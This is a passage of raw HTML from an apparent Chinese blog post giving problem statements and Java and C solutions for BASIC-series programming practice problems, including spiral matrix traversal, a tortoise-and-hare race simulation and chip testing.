class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> h = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> m = in.nextInt();</span><br><span class="line"></span><br><span class="line">        String hour,minite;</span><br><span class="line">        String[] arr = &#123;<span class="string">"zero"</span>,<span class="string">"one"</span>,<span class="string">"two"</span>,<span class="string">"three"</span>,<span class="string">"four"</span>,<span class="string">"five"</span>,<span class="string">"six"</span>,<span class="string">"seven"</span>,<span class="string">"eight"</span>,<span class="string">"nine"</span>,<span class="string">"ten"</span>,<span class="string">"eleven"</span>,<span class="string">"twelve"</span>,<span class="string">"thirteen"</span>,<span class="string">"fourteen"</span>,<span class="string">"fifteen"</span>,<span class="string">"sixteen"</span>,<span class="string">"seventeen"</span>,<span class="string">"eighteen"</span>,<span class="string">"nineteen"</span>,<span class="string">"twenty"</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(h&lt;<span class="number">0</span> || h&gt;<span class="number">24</span> || m&lt;<span class="number">0</span> || h&gt;<span class="number">60</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(h&lt;=<span class="number">20</span> &amp;&amp; h&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(h == i)&#123;</span><br><span class="line">                    System.out.print(arr[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(h&gt;<span class="number">20</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(h%<span class="number">10</span> == i)&#123;</span><br><span class="line">                    System.out.print(arr[<span class="number">20</span>]+<span class="string">" "</span>+arr[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(<span class="string">" "</span>);</span><br><span class="line"></span><br><span class="line">        String temp = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">switch</span> (m/<span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:temp = <span class="string">"twenty"</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:temp = <span class="string">"thirty"</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:temp = <span class="string">"forty"</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:temp = <span class="string">"fifty"</span>;<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(m&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(m == i)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(m == <span class="number">0</span>)&#123;</span><br><span class="line">                        System.out.print(<span class="string">"o'clock"</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        System.out.print(arr[i]);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(m%<span class="number">10</span> == i)&#123;</span><br><span class="line">                    System.out.print(temp+<span class="string">" "</span>+arr[i]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-25-回形取数"><a href="#BASIC-25-回形取数" class="headerlink" title="BASIC-25 回形取数"></a>BASIC-25 回形取数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　回形取数就是沿矩阵的边取数，若当前方向上无数可取或已经取过，则左转90度。一开始位于矩阵左上角，方向向下。</span><br><span class="line">输入格式</span><br><span class="line">　　输入第一行是两个不超过200的正整数m, n，表示矩阵的行和列。接下来m行每行n个整数，表示这个矩阵。</span><br><span class="line">输出格式</span><br><span class="line">　　输出只有一行，共mn个数，为输入矩阵回形取数得到的结果。数之间用一个空格分隔，行末不要有多余的空格。</span><br><span class="line">样例输入</span><br><span class="line">3 3</span><br><span class="line">1 2 3</span><br><span class="line">4 5 6</span><br><span class="line">7 8 9</span><br><span class="line">样例输出</span><br><span class="line">1 4 7 8 9 6 3 2 5</span><br><span class="line">样例输入</span><br><span class="line">3 2</span><br><span class="line">1 2</span><br><span class="line">3 4</span><br><span class="line">5 6</span><br><span class="line">样例输出</span><br><span class="line">1 3 5 6 4 2</span><br></pre></td></tr></table></figure><p>运行一直超时，改用了下C语言<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;<span class="comment">//回形取数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner input=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> m=input.nextInt(),n=input.nextInt();</span><br><span class="line">        <span class="keyword">int</span> arr[][]=<span class="keyword">new</span> <span class="keyword">int</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                arr[i][j]=input.nextInt();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (n + <span class="number">1</span>) / <span class="number">2</span> &amp;&amp; i &lt; (m + <span class="number">1</span>) / <span class="number">2</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (j = i; j &lt; m - i; j++)</span><br><span class="line">                System.out.print(arr[j][i]+<span class="string">" "</span>);</span><br><span class="line">            <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n - i; j++)</span><br><span class="line">                System.out.print(arr[m - i - <span class="number">1</span>][j]+<span class="string">" "</span>);</span><br><span class="line">            <span class="keyword">if</span> (n - i - <span class="number">1</span> &gt; i)<span class="comment">/*（当n为奇数时最后一次循环只有左一列的数据。）</span></span><br><span class="line"><span class="comment">                                前面每进一次循环都读了对称的两列数据，前面i-1次循环读了2i个数据（i从0开始）在这次判断之前又读了一列数据</span></span><br><span class="line"><span class="comment">                                所以判断有没有对称的右列数据只要判断n-2*i-1是否大于0（等价于n - i - 1 &gt; i）  */</span></span><br><span class="line">                <span class="keyword">for</span> (j = m - i - <span class="number">2</span>; j &gt;= i; j--)</span><br><span class="line">                    System.out.print( arr[j][n - i - <span class="number">1</span>]+<span class="string">" "</span>);</span><br><span class="line">            <span class="keyword">if</span> (m - i - <span class="number">1</span> &gt; i)</span><br><span class="line">                <span class="keyword">for</span> (j = n - i - <span class="number">2</span>; j &gt; i; j--)</span><br><span class="line">                    System.out.print( arr[i][j]+<span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, m, n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">200</span>][<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;m, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i][j]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (n + <span class="number">1</span>) / <span class="number">2</span> &amp;&amp; i &lt; (m + <span class="number">1</span>) / <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = i; j &lt; m - i; j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>, a[j][i]);</span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n - i; j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>, a[m - i - <span class="number">1</span>][j]);</span><br><span class="line">        <span class="keyword">if</span> (n - i - <span class="number">1</span> &gt; i)</span><br><span class="line">            <span class="keyword">for</span> (j = m - i - <span class="number">2</span>; j &gt;= i; j--)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d "</span>, a[j][n - i - <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> (m - i - <span class="number">1</span> &gt; i)</span><br><span class="line">            <span class="keyword">for</span> (j = n - i - <span class="number">2</span>; j &gt; i; j--)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d "</span>, a[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-24-龟兔赛跑预测"><a href="#BASIC-24-龟兔赛跑预测" class="headerlink" title="BASIC-24 龟兔赛跑预测"></a>BASIC-24 龟兔赛跑预测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　话说这个世界上有各种各样的兔子和乌龟，但是研究发现，所有的兔子和乌龟都有一个共同的特点——喜欢赛跑。于是世界上各个角落都不断在发生着乌龟和兔子的比赛，小华对此很感兴趣，于是决定研究不同兔子和乌龟的赛跑。他发现，兔子虽然跑比乌龟快，但它们有众所周知的毛病——骄傲且懒惰，于是在与乌龟的比赛中，一旦任一秒结束后兔子发现自己领先t米或以上，它们就会停下来休息s秒。对于不同的兔子，t，s的数值是不同的，但是所有的乌龟却是一致——它们不到终点决不停止。</span><br><span class="line">　　然而有些比赛相当漫长，全程观看会耗费大量时间，而小华发现只要在每场比赛开始后记录下兔子和乌龟的数据——兔子的速度v1（表示每秒兔子能跑v1米），乌龟的速度v2，以及兔子对应的t，s值，以及赛道的长度l——就能预测出比赛的结果。但是小华很懒，不想通过手工计算推测出比赛的结果，于是他找到了你——清华大学计算机系的高才生——请求帮助，请你写一个程序，对于输入的一场比赛的数据v1，v2，t，s，l，预测该场比赛的结果。</span><br><span class="line">输入格式</span><br><span class="line">　　输入只有一行，包含用空格隔开的五个正整数v1，v2，t，s，l，其中(v1,v2&lt;=100;t&lt;=300;s&lt;=10;l&lt;=10000且为v1,v2的公倍数)</span><br><span class="line">输出格式</span><br><span class="line">　　输出包含两行，第一行输出比赛结果——一个大写字母“T”或“R”或“D”，分别表示乌龟获胜，兔子获胜，或者两者同时到达终点。</span><br><span class="line">　　第二行输出一个正整数，表示获胜者（或者双方同时）到达终点所耗费的时间（秒数）。</span><br><span class="line">样例输入</span><br><span class="line">10 5 5 2 20</span><br><span class="line">样例输出</span><br><span class="line">D</span><br><span class="line">4</span><br><span class="line">样例输入</span><br><span class="line">10 5 5 1 20</span><br><span class="line">样例输出</span><br><span class="line">R</span><br><span class="line">3</span><br><span class="line">样例输入</span><br><span class="line">10 5 5 3 20</span><br><span class="line">样例输出</span><br><span class="line">T</span><br><span class="line">4</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">法一：</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> vr = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> vt = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> t = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> s = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> l = in.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ttime = l / vt; <span class="comment">// 乌龟的时间固定</span></span><br><span class="line">        <span class="keyword">int</span> cnttime= <span class="number">0</span>;     <span class="comment">// 记录时间，相当于时钟</span></span><br><span class="line">        <span class="keyword">int</span> lent = <span class="number">0</span>;   <span class="comment">// 乌龟的路程</span></span><br><span class="line">        <span class="keyword">int</span> lenr = <span class="number">0</span>;   <span class="comment">// 兔子的路程</span></span><br><span class="line">        <span class="keyword">int</span> breaktime = <span class="number">0</span>;  <span class="comment">// 兔子休息的时间</span></span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">0</span>;   <span class="comment">// flag==0表示兔子不在休息，flag==1表示兔子正在休息</span></span><br><span class="line">        <span class="keyword">while</span> (lenr&lt;l &amp;&amp; lent&lt;l)&#123;   <span class="comment">// 兔子和乌龟都没到终点</span></span><br><span class="line">            <span class="keyword">if</span>(flag == <span class="number">0</span> &amp;&amp; lenr-lent&lt;t || (flag==<span class="number">1</span> &amp;&amp; breaktime&gt;=s))&#123;  <span class="comment">// 兔子不休息的条件</span></span><br><span class="line">                lenr = lenr+vr;</span><br><span class="line">                flag=<span class="number">0</span>;</span><br><span class="line">                breaktime=<span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  <span class="comment">// 兔子休息时</span></span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                breaktime++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 乌龟</span></span><br><span class="line">            lent = lent+vt;</span><br><span class="line">            cnttime++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(lent&gt;=l &amp;&amp; lenr &lt; l)&#123;    <span class="comment">// 乌龟win</span></span><br><span class="line">            System.out.println(<span class="string">"T"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(lent&lt;l &amp;&amp; lenr &gt;= l)&#123;</span><br><span class="line">            System.out.println(<span class="string">"R"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"D"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(cnttime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line"></span><br><span class="line">法二：<span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> v1;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> v2;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> t;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> s;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> l;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        v1 = in.nextInt();</span><br><span class="line">        v2 = in.nextInt();</span><br><span class="line">        t = in.nextInt();</span><br><span class="line">        s = in.nextInt();</span><br><span class="line">        l = in.nextInt();</span><br><span class="line">        run(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 细化成一秒一秒的，</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> times 经过的秒数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> rl    兔子经过的距离</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> tl    乌龟经过的距离</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sLeft 兔子休息剩余时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">int</span> times,<span class="keyword">int</span> rl,<span class="keyword">int</span> tl,<span class="keyword">int</span> sLeft)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sLeft == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(rl - tl&gt;=t)&#123;</span><br><span class="line">                <span class="comment">// 这一秒直接用掉，告诉下一次还剩多少秒</span></span><br><span class="line">                sLeft = s-<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                rl+=v1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 兔子这一秒需要休息</span></span><br><span class="line">            sLeft--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tl+=v2;</span><br><span class="line">        times++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(rl==l &amp;&amp; tl == l)&#123;</span><br><span class="line">            System.out.println(<span class="string">"D"</span>);</span><br><span class="line">            System.out.println(times);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(rl==l&amp;&amp;tl!=l)&#123;</span><br><span class="line">            System.out.println(<span class="string">"R"</span>);</span><br><span class="line">            System.out.println(times);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(rl!=l&amp;&amp;tl==l)&#123;</span><br><span class="line">            System.out.println(<span class="string">"T"</span>);</span><br><span class="line">            System.out.println(times);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        run(times,rl,tl,sLeft);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-23-芯片测试"><a href="#BASIC-23-芯片测试" class="headerlink" title="BASIC-23 芯片测试"></a>BASIC-23 芯片测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　有n（2≤n≤20）块芯片，有好有坏，已知好芯片比坏芯片多。</span><br><span class="line">　　每个芯片都能用来测试其他芯片。用好芯片测试其他芯片时，能正确给出被测试芯片是好还是坏。而用坏芯片测试其他芯片时，会随机给出好或是坏的测试结果（即此结果与被测试芯片实际的好坏无关）。</span><br><span class="line">　　给出所有芯片的测试结果，问哪些芯片是好芯片。</span><br><span class="line">输入格式</span><br><span class="line">　　输入数据第一行为一个整数n，表示芯片个数。</span><br><span class="line">　　第二行到第n+1行为n*n的一张表，每行n个数据。表中的每个数据为0或1，在这n行中的第i行第j列（1≤i, j≤n）的数据表示用第i块芯片测试第j块芯片时得到的测试结果，1表示好，0表示坏，i=j时一律为1（并不表示该芯片对本身的测试结果。芯片不能对本身进行测试）。</span><br><span class="line">输出格式</span><br><span class="line">　　按从小到大的顺序输出所有好芯片的编号</span><br><span class="line">样例输入</span><br><span class="line">3</span><br><span class="line">1 0 1</span><br><span class="line">0 1 0</span><br><span class="line">1 0 1</span><br><span class="line">样例输出</span><br><span class="line">1 3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[][] arr = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">        <span class="keyword">boolean</span>[][] flag = <span class="keyword">new</span> <span class="keyword">boolean</span>[n][n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">                arr[i][j] = in.nextInt();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">                sum+=arr[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(sum&gt;(n/<span class="number">2</span>))&#123;</span><br><span class="line">                System.out.print(j+<span class="number">1</span>+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-22-FJ的字符串"><a href="#BASIC-22-FJ的字符串" class="headerlink" title="BASIC-22 FJ的字符串"></a>BASIC-22 FJ的字符串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 